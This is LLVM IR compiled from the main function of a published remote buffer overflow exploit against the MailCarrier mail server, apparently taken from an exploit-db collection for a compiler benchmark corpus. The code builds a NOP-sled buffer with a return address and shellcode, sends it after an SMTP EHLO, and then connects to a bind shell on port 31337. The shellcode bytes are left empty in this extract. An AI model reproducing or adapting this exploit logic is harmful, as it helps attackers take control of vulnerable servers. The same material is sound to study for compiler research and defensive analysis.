; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_637.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_637.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [18 x i8] c"Usage: TargetIP.\0A\00", align 1
@.str.1 = private unnamed_addr constant [54 x i8] c"**MailCarrier Buffer Overflow Exploit by NoPh0BiA.**\0A\00", align 1
@RET = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@PORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [26 x i8] c"[x] Sending evil buffer..\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"EHLO \00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"done.\0A\00", align 1
@.str.6 = private unnamed_addr constant [39 x i8] c"[x] Trying to connect to port 31337..\0A\00", align 1
@RPORT = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [12 x i8] c"[x] 0wn3d!\0A\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %10 = call i8* @malloc(i32 5530)
  store i8* %10, i8** %5, align 8
  %11 = call i8* @malloc(i32 32)
  store i8* %11, i8** %6, align 8
  %12 = load i32, i32* %3, align 4
  %13 = icmp slt i32 %12, 2
  br i1 %13, label %14, label %17

14:                                               ; preds = %2
  %15 = call i32 @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 @exit(i32 0) #3
  unreachable

17:                                               ; preds = %2
  %18 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.1, i64 0, i64 0))
  %19 = load i8**, i8*** %4, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  store i8* %21, i8** %7, align 8
  %22 = load i8*, i8** %5, align 8
  %23 = call i32 @memset(i8* %22, i32 0, i32 5530)
  %24 = load i8*, i8** %6, align 8
  %25 = call i32 @memset(i8* %24, i32 65, i32 32)
  %26 = load i8*, i8** %5, align 8
  %27 = call i32 @memset(i8* %26, i32 144, i32 5095)
  %28 = load i8*, i8** %5, align 8
  %29 = load i8*, i8** @RET, align 8
  %30 = call i32 @strcat(i8* %28, i8* %29)
  %31 = load i8*, i8** %5, align 8
  %32 = load i8*, i8** %6, align 8
  %33 = call i32 @strcat(i8* %31, i8* %32)
  %34 = load i8*, i8** %5, align 8
  %35 = load i8*, i8** @shellcode, align 8
  %36 = call i32 @strcat(i8* %34, i8* %35)
  %37 = load i8*, i8** %7, align 8
  %38 = load i32, i32* @PORT, align 4
  %39 = call i32 @conn(i8* %37, i32 %38)
  store i32 %39, i32* %8, align 4
  %40 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  %41 = call i32 @sleep(i32 3)
  %42 = load i32, i32* %8, align 4
  %43 = call i32 @write(i32 %42, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i32 5)
  %44 = call i32 @sleep(i32 1)
  %45 = load i32, i32* %8, align 4
  %46 = load i8*, i8** %5, align 8
  %47 = call i32 @write(i32 %45, i8* %46, i32 5530)
  %48 = load i32, i32* %8, align 4
  %49 = call i32 @write(i32 %48, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i32 4)
  %50 = call i32 @sleep(i32 2)
  %51 = load i32, i32* %8, align 4
  %52 = call i32 @close(i32 %51)
  %53 = call i32 @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  %54 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.6, i64 0, i64 0))
  %55 = load i8*, i8** %7, align 8
  %56 = load i32, i32* @RPORT, align 4
  %57 = call i32 @conn(i8* %55, i32 %56)
  store i32 %57, i32* %9, align 4
  %58 = call i32 @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0))
  %59 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0))
  %60 = load i32, i32* %9, align 4
  %61 = call i32 @shell(i32 %60)
  ret i32 0
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @conn(i8*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @shell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
